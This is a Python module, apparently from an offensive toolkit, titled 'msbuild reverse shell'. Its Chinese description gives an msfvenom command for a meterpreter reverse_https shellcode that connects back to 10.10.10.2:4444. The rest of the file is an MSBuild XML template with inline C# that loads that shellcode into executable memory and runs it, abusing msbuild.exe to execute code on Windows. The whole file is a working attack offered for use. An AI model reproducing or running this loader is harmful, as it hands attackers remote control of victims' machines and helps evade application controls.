# encoding: utf8

class Shell:
    def __init__(self):
        self.info = {
            'Name': 'msbuild reverse shell',
            'Author': 'whois',
            'Update': '2020/02/19',
        }

        self.desc_reverse = """
MSBuild是Microsoft Build Engine的一部分，Microsoft Build Engine是一种软件构建系统，可按照其XML输入文件中的指定构建应用程序。

Platform: Windows 7+

metasploit生成C#的shellcode
    msfvenom -p windows/meterpreter/reverse_https LHOST=10.10.10.2 LPORT=4444 -f csharp

执行payload
    C:\Windows\Microsoft.NET\Framework\\v4.0.30319\msbuild.exe 1.xml
"""

        self.payload = """
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
    
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {{         
          private static UInt32 MEM_COMMIT = 0x1000;          
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
          [DllImport("kernel32")]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
          [DllImport("kernel32")]
            private static extern IntPtr CreateThread(            
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId           
            );
          [DllImport("kernel32")]
            private static extern UInt32 WaitForSingleObject(           
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );          
          public override bool Execute()
          {{
            byte[] shellcode =  new byte[504] {{ 
            {shellcode}       
            }};
              
              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
              IntPtr hThread = IntPtr.Zero;
              UInt32 threadId = 0;
              IntPtr pinfo = IntPtr.Zero;
              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
              WaitForSingleObject(hThread, 0xFFFFFFFF);
              return true;
          }}
        }}     
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>"""
